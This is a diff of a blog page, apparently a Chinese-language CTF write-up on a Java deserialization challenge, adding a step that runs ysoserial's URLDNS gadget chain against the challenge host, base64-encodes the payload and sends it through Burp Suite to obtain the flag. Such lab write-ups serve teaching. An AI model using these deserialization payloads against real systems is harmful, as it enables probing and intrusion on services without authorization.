@@ -246,7 +246,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Java/" style="color: #00bcd4">Java</a>
+                <a href="/blog/tags/Java/" style="color: #ff7d73">Java</a>
             </span>
             
         </span>
@@ -269,7 +269,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">5分</span>
+        <span class="post-count">6分</span>
       </span>
     </span>
     
@@ -437,6 +437,11 @@
 然后进行反序列化
 构造出对当前题目地址的dns查询即可获得flag <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
+<p>在linux下执行命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-all.jar URLDNS http://7845016f-8187-4375-92c3-90e82fe40990.challenge.ctf.show<span class="token operator">|</span>
+base64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后把得到的base64字符串用burpsuite传入即可</p>
 
     </div>
     
